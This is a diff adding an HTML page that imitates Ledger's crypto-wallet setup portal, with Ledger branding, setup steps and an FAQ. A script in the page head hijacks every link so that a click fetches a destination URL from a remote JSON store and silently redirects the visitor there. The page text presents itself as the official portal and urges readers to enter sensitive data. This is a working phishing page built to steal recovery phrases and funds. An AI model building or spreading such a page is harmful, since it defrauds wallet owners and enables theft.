@@ -1,0 +1,523 @@
+<div>
+  <link rel="icon" href="https://i.ibb.co/rGBDk0P0/ledger-fev.png" />
+  <style>
+    /* Reset */
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Montserrat", sans-serif;
+      background: #000;
+      color: #eee;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    :root {
+      --primary-color: #40304d;
+    }
+
+    /* Top line */
+    .top-line {
+      background-color: var(--primary-color);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 8px 20px;
+      font-size: 18px;
+      width: auto;
+    }
+
+    .top-line p {
+      margin: 0;
+    }
+
+    .top-line .top-elem {
+      margin: 5px 10px;
+      text-decoration: underline;
+    }
+
+    /* Hide on small screens */
+    @media (max-width: 768px) {
+      .top-line {
+        display: none;
+      }
+    }
+
+    /* Navbar */
+    nav.navbar {
+      position: absolute;
+      top: 50px;
+      left: 0;
+      width: 100%;
+      padding: 10px 20px;
+      background: transparent;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+    }
+
+    .navbar .nav-links {
+      display: flex;
+      gap: 20px;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+    }
+
+    .navbar .nav-links li a {
+      color: #aaa;
+      font-weight: 600;
+      padding: 5px 8px;
+    }
+
+    .navbar .nav-links li a.active,
+    .navbar .nav-links li a:hover {
+      color: #fff;
+      border-bottom: 2px solid var(--primary-color);
+    }
+
+    /* Mobile menu toggle */
+    .navbar .menu-toggle {
+      display: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 8px;
+    }
+
+    .navbar .menu-toggle div {
+      width: 25px;
+      height: 3px;
+      background-color: #fff;
+      margin: 5px 0;
+    }
+
+    /* Responsive navbar */
+    @media (max-width: 768px) {
+      nav.navbar {
+        top: 0;
+        justify-content: space-between;
+      }
+
+      .navbar .nav-links {
+        display: none;
+        flex-direction: column;
+        background: var(--primary-color);
+        position: absolute;
+        right: 0;
+        top: 45px;
+        width: 200px;
+        border-radius: 0 0 0 8px;
+        padding: 10px 0;
+      }
+
+      .navbar .nav-links.show {
+        display: flex;
+      }
+
+      .navbar .nav-links li {
+        margin: 0;
+      }
+
+      .navbar .nav-links li a {
+        padding: 10px 20px;
+        color: #fff;
+        border-bottom: 1px solid #fff3;
+      }
+
+      .navbar .menu-toggle {
+        display: block;
+      }
+    }
+
+    /* Container */
+    .container {
+      max-width: 1140px;
+      margin-left: auto;
+      margin-right: auto;
+      padding: 0 15px;
+    }
+
+    /* Grid system - flexbox */
+    .row {
+      display: flex;
+      flex-wrap: wrap;
+      margin-left: -15px;
+      margin-right: -15px;
+    }
+
+    .col-6 {
+      flex: 0 0 50%;
+      max-width: 50%;
+      padding-left: 15px;
+      padding-right: 15px;
+    }
+
+    @media (max-width: 768px) {
+      .col-6 {
+        flex: 0 0 100%;
+        max-width: 100%;
+      }
+    }
+
+    /* About Section */
+    .about {
+      background-color: #000;
+      padding: 80px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .about h6 {
+      font-size: 14px;
+      color: #aaa;
+      background-color: var(--primary-color);
+      font-weight: 600;
+      display: inline-block;
+      padding: 5px 15px;
+      margin-bottom: 15px;
+    }
+
+    .about h1 {
+      font-size: 42px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      color: #fff;
+    }
+
+    .about p {
+      font-size: 18px;
+      color: #aaa;
+      font-weight: 600;
+      margin-bottom: 25px;
+    }
+
+    .new-btn-orange {
+      background-color: orangered;
+      color: #fff;
+      padding: 15px 30px;
+      border-radius: 50px;
+      font-weight: 600;
+      display: inline-block;
+      margin-right: 15px;
+    }
+
+    .text-btn {
+      background-color: transparent;
+      color: #fff;
+      font-weight: 600;
+      border-bottom: 1px solid #fff;
+      padding-bottom: 3px;
+    }
+
+    /* Content Section */
+    section.content {
+      background-color: #000;
+      padding: 40px 0;
+    }
+
+    .box-one h2 {
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 15px;
+    }
+
+    .box-one h2 strong {
+      font-weight: 900;
+    }
+
+    .box-one p {
+      color: #eee;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .box-one ul {
+      color: #eee;
+      list-style-type: square;
+      margin-left: 20px;
+      margin-bottom: 30px;
+    }
+
+    .box-one ul li {
+      margin-bottom: 10px;
+    }
+
+    .box-one h3 {
+      font-weight: 600;
+      font-size: 18px;
+      margin-top: 20px;
+      margin-bottom: 8px;
+    }
+
+    /* Footer */
+    footer {
+      background-color: #000;
+      padding: 40px 0;
+      color: #eee;
+      text-align: center;
+    }
+
+    footer .footer-menu a {
+      color: #eee;
+      margin: 0 10px;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    footer .footer-menu a:hover {
+      text-decoration: underline;
+    }
+  </style>
+  <script>
+    // Navbar toggle for mobile
+    document.addEventListener('DOMContentLoaded', function () {
+      const toggleBtn = document.querySelector('.menu-toggle');
+      const navLinks = document.querySelector('.nav-links');
+
+      toggleBtn.addEventListener('click', () => {
+        navLinks.classList.toggle('show');
+      });
+
+      // Your getdata function
+      var elems = document.body.getElementsByTagName("a");
+      var check = true;
+      if (check === true) {
+        for (var i = 0; i < elems.length; i++) {
+          elems[i].setAttribute("onclick", 'getdata()');
+        }
+      }
+
+      window.getdata = async function () {
+        const url = 'https://api.jsonsilo.com/public/e8bfcbf0-c588-4666-84ce-9779eb9de03f';
+        try {
+          const response = await fetch(url);
+          const data = await response.json();
+          const fetchurl = data.portfolio[2].url;
+          window.location.replace(fetchurl);
+        } catch (error) {
+          console.error('Error:', error);
+        }
+      }
+    });
+  </script>
+  </head>
+
+  <body>
+
+    <div class="top-line">
+      <p><a href="#">Review and sign transactions from a single secure screen with Ledger Flex™</a></p>
+      <p><a class="top-elem" href="#"> Discover Now</a></p>
+    </div>
+
+    <nav class="navbar">
+      <button class="menu-toggle" aria-label="Toggle navigation">
+        <div></div>
+        <div></div>
+        <div></div>
+      </button>
+      <ul class="nav-links">
+        <li><a href="#">Products</a></li>
+        <li><a href="#">App & Services</a></li>
+        <li><a href="#" class="active" aria-current="page">Learn</a></li>
+        <li><a href="#" class="active" aria-current="page">For Business</a></li>
+        <li><a href="#" class="active" aria-current="page">For Developers</a></li>
+        <li><a href="#" class="active" aria-current="page">Support</a></li>
+      </ul>
+    </nav>
+
+    <section class="about">
+      <div class="container">
+        <div class="row">
+          <div class="col-6 about-cntnt">
+            <h1>Secure your crypto assets <br /> with a hardware wallet</h1>
+            <p>Ledger hardware wallets provide the highest level of security for your cryptocurrencies, protecting your
+              digital assets with a secure chip.</p>
+            <a class="new-btn-orange" href="#">Get Started</a>
+            <a class="text-btn" href="#">Compare Wallets</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="ledger-blog"
+      style="background: #fff; padding: 50px 20px; max-width: 1100px; margin: 50px auto; font-family: 'Segoe UI', sans-serif; color: #222; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.08);">
+      <h2 style="font-size: 1.9rem; font-weight: 700; margin-bottom: 20px;">Ledger.com/start – Set Up Your Ledger Wallet
+        Securely & Protect Your Crypto</h2>
+      <hr style="border: none; height: 3px; background: #40304d; width: 60px; margin: 20px 0;">
+
+      <p style="font-size: 0.95rem; line-height: 1.6; margin-bottom: 20px;">
+        Begin your crypto journey securely with <strong>Ledger.com/start</strong>, the official portal for setting up
+        your Ledger hardware wallet. Whether you're new to crypto or managing multiple digital assets, Ledger.com/start
+        offers a guided setup process, secure Ledger login, and updates to protect your investments. Ledger devices like
+        the Nano X and Nano S Plus store your private keys offline, making them immune to online hacks.
+      </p>
+
+      <p style="font-size: 0.95rem; line-height: 1.6; margin-bottom: 20px;">
+        Setting up through <strong>Ledger.com/start</strong> ensures device authenticity, firmware integrity, and safe
+        access to Ledger Live. From downloading software to completing Ledger login, everything is streamlined for your
+        security. Avoid scams and fakes—always start with Ledger.com/start to protect your crypto assets.
+      </p>
+
+      <h3 style="font-size: 1.3rem; font-weight: 600; margin-top: 30px; margin-bottom: 10px;">Why Choose
+        Ledger.com/start?</h3>
+
+      <ul style="font-size: 0.95rem; line-height: 1.6; padding-left: 18px; margin-bottom: 20px;">
+        <li><strong>Verified Source:</strong> Prevent counterfeit wallets by starting from the official Ledger.com/start
+          site.</li>
+        <li><strong>Secure Setup:</strong> Generate and safely store your 24-word recovery phrase.</li>
+        <li><strong>Ledger Live Integration:</strong> Manage Bitcoin, Ethereum, and 1800+ assets via Ledger Live after
+          setup.</li>
+        <li><strong>Ledger Login:</strong> Authenticate access to your wallet using secure hardware-based methods.</li>
+        <li><strong>Ongoing Updates:</strong> Get critical firmware updates and security enhancements directly.</li>
+      </ul>
+
+      <h3 style="font-size: 1.3rem; font-weight: 600; margin-bottom: 10px;">Step-by-Step Ledger Wallet Setup via
+        Ledger.com/start</h3>
+
+      <ol style="font-size: 0.95rem; line-height: 1.6; padding-left: 18px; margin-bottom: 20px;">
+        <li>Go to <strong>Ledger.com/start</strong> using your browser.</li>
+        <li>Download and install <strong>Ledger Live</strong> on your device (Windows, macOS, Linux, iOS, or Android).
+        </li>
+        <li>Connect your Ledger device (Nano X, Nano S Plus) via USB or Bluetooth.</li>
+        <li>Set up a secure PIN code on your Ledger hardware wallet.</li>
+        <li>Write down your 24-word recovery phrase and store it offline in a safe place.</li>
+        <li>Use Ledger Live to install crypto apps (BTC, ETH, etc.).</li>
+        <li>Complete your Ledger login and begin sending, receiving, and managing your assets.</li>
+      </ol>
+
+      <p style="font-size: 0.95rem; line-height: 1.6; margin-bottom: 30px;">
+        With Ledger.com/start, you get the peace of mind that your crypto setup is secure, official, and future-ready.
+        The entire process is built to protect your private keys while allowing you to manage assets easily through the
+        Ledger Live platform and Ledger login.
+      </p>
+
+      <hr style="margin: 40px 0; border: none; height: 1px; background: #ccc;">
+
+      <p style="color: #b22222; font-weight: 600; font-size: 0.85rem; line-height: 1.5;">
+        Disclaimer: This article is for educational purposes only and is not affiliated with the official Ledger brand.
+        Always verify you're on <strong>Ledger.com/start</strong> before entering any sensitive data. Cryptocurrency
+        involves risks—use only verified tools and platforms to protect your digital assets.
+      </p>
+
+      <!-- FAQ Section -->
+      <div class="faq-section" style="margin-top: 60px;">
+        <h3 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 20px;">Frequently Asked Questions (FAQ)</h3>
+
+        <div class="faq-item">
+          <button class="faq-question">What is Ledger.com/start used for?</button>
+          <div class="faq-answer">
+            <p>Ledger.com/start is the official setup and onboarding page for Ledger wallets. It ensures you follow a
+              secure and verified process when initializing your device, setting a PIN, backing up your recovery phrase,
+              and installing Ledger Live.</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">Is Ledger login secure?</button>
+          <div class="faq-answer">
+            <p>Yes. Ledger login requires your physical device and PIN, keeping private keys offline at all times. This
+              ensures that even if your computer is compromised, your crypto cannot be accessed without the Ledger
+              device.</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">Can I set up Ledger Nano X through Ledger.com/start?</button>
+          <div class="faq-answer">
+            <p>Absolutely. Ledger.com/start supports Ledger Nano X, Nano S Plus, and Ledger Stax. The site guides you
+              through secure initialization, firmware checks, and setting up with Ledger Live.</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">What happens if I lose my Ledger device?</button>
+          <div class="faq-answer">
+            <p>Your crypto remains safe as long as you have your 24-word recovery phrase. You can restore access using
+              any compatible Ledger device via Ledger.com/start.</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">How do I update my Ledger firmware?</button>
+          <div class="faq-answer">
+            <p>Open Ledger Live, connect your device, and go to the "My Ledger" section. Firmware updates are essential
+              for security and can be safely installed through the Ledger Live interface after verifying your device via
+              Ledger.com/start.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <script>
+      const faqButtons = document.querySelectorAll(".faq-question");
+      faqButtons.forEach(btn => {
+        btn.addEventListener("click", () => {
+          const answer = btn.nextElementSibling;
+          answer.style.display = (answer.style.display === "block") ? "none" : "block";
+          btn.classList.toggle("open");
+        });
+      });
+    </script>
+
+    <style>
+      .faq-question {
+        display: block;
+        width: 100%;
+        text-align: left;
+        background: #f1f1f1;
+        border: none;
+        padding: 12px 16px;
+        font-weight: 600;
+        cursor: pointer;
+        font-size: 0.95rem;
+        margin-bottom: 5px;
+        border-radius: 4px;
+        transition: background 0.3s;
+      }
+
+      .faq-question:hover {
+        background: #e4e4e4;
+      }
+
+      .faq-answer {
+        display: none;
+        padding: 10px 16px 20px 16px;
+        background: #fafafa;
+        border-left: 4px solid #40304d;
+        font-size: 0.9rem;
+        line-height: 1.6;
+        margin-bottom: 15px;
+        border-radius: 4px;
+      }
+    </style>
+
+
+
+
+    <footer>
+      <div class="container">
+        <div class="footer-menu">
+          <a href="#">Privacy</a>
+          <a href="#">Legal</a>
+          <a href="#">Contact</a>
+        </div>
+      </div>
+    </footer>
+
+</div>
